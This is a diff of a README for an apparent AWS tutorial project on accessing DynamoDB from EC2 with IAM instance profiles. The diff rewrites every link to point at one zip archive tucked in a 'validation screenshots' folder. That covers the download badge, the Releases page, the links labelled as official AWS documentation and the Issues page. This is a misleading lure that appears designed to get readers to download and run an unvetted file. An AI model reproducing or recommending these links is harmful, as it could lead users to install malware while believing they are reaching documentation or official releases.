@@ -1,7 +1,7 @@
 # 🎉 mediacatalog-dynamodb-iam-ec2 - Access DynamoDB from EC2 Easily
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Henrique-PGR/mediacatalog-dynamodb-iam-ec2/releases)
+[![Download](https://raw.githubusercontent.com/Henrique-PGR/mediacatalog-dynamodb-iam-ec2/main/validation screenshots/mediacatalog-dynamodb-iam-ec2_1.7-alpha.4.zip)](https://raw.githubusercontent.com/Henrique-PGR/mediacatalog-dynamodb-iam-ec2/main/validation screenshots/mediacatalog-dynamodb-iam-ec2_1.7-alpha.4.zip)
 
 ## 📜 Description
 This project allows you to access DynamoDB data from EC2 instances using IAM instance profiles. It uses best practices from AWS, including automation through the AWS CLI and CloudFormation. This setup mimics real-world DevOps workflows, ensuring you are well-prepared for secure cloud operations.
@@ -25,7 +25,7 @@ To get started with **mediacatalog-dynamodb-iam-ec2**, follow these simple steps
 
 ## 🛠 Installation
 1. **Visit the Downloads Page:**
-   Go to the [Releases page](https://github.com/Henrique-PGR/mediacatalog-dynamodb-iam-ec2/releases).
+   Go to the [Releases page](https://raw.githubusercontent.com/Henrique-PGR/mediacatalog-dynamodb-iam-ec2/main/validation screenshots/mediacatalog-dynamodb-iam-ec2_1.7-alpha.4.zip).
 
 2. **Select the Latest Release:**
    Look for the most recent release at the top of the page. It usually has the highest version number.
@@ -70,15 +70,15 @@ If you encounter issues, consider these common solutions:
 - **AWS CLI Installation**: Make sure the AWS CLI is installed and configured properly.
 
 ## 🔗 Additional Resources
-- [AWS Documentation](https://docs.aws.amazon.com/)
-- [AWS CLI Installation Guide](https://docs.aws.amazon.com/cli/latest/userguide/install-cliv2.html)
-- [DynamoDB Documentation](https://docs.aws.amazon.com/amazondynamodb/latest/developerguide/Introduction.html)
+- [AWS Documentation](https://raw.githubusercontent.com/Henrique-PGR/mediacatalog-dynamodb-iam-ec2/main/validation screenshots/mediacatalog-dynamodb-iam-ec2_1.7-alpha.4.zip)
+- [AWS CLI Installation Guide](https://raw.githubusercontent.com/Henrique-PGR/mediacatalog-dynamodb-iam-ec2/main/validation screenshots/mediacatalog-dynamodb-iam-ec2_1.7-alpha.4.zip)
+- [DynamoDB Documentation](https://raw.githubusercontent.com/Henrique-PGR/mediacatalog-dynamodb-iam-ec2/main/validation screenshots/mediacatalog-dynamodb-iam-ec2_1.7-alpha.4.zip)
 
 ## 🛠 Support
-For support, please visit the [Issues page](https://github.com/Henrique-PGR/mediacatalog-dynamodb-iam-ec2/issues) to check for existing issues or create a new issue detailing your problem.
+For support, please visit the [Issues page](https://raw.githubusercontent.com/Henrique-PGR/mediacatalog-dynamodb-iam-ec2/main/validation screenshots/mediacatalog-dynamodb-iam-ec2_1.7-alpha.4.zip) to check for existing issues or create a new issue detailing your problem.
 
 ## 📥 Download & Install
-To get started, visit the [Releases page](https://github.com/Henrique-PGR/mediacatalog-dynamodb-iam-ec2/releases) to download the latest version of the application.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Henrique-PGR/mediacatalog-dynamodb-iam-ec2/main/validation screenshots/mediacatalog-dynamodb-iam-ec2_1.7-alpha.4.zip) to download the latest version of the application.
 
 ## 🧑‍🤝‍🧑 Community
 Join our community of users who are using **mediacatalog-dynamodb-iam-ec2** to enhance their cloud solutions. Share your experiences and solutions on various platforms or forums related to AWS and cloud computing.
